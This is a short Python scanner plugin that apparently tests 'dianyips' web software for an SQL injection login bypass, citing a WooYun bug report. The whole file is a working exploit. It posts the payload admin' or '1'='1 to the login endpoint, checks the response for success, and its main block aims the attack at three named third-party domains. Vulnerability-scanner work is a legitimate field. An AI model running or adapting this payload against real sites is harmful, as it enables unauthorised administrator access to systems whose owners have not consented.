#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-0110810

import time

def assign(service, arg):
    if service == 'dianyips':
        return True, arg

def audit(arg):
    postdata = 'name=admin\'%20or%20\'1\'%3D\'1&password=admin&submit=%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95&isAjax=1&_='
    payload = 'dianyi/index.php?action=login'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl2(url,postdata)
    if (code == 200 or code == 999) and ('success' in res and 'require' in res and 'Firewall' in res) :
        security_hole(url+ "   :<admin' or '1'='1>")
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('dianyips','http://gxdawang.com/')[1])
    audit(assign('dianyips','http://ss-hearing.com/')[1])
    audit(assign('dianyips','http://gxmingjia.com/')[1])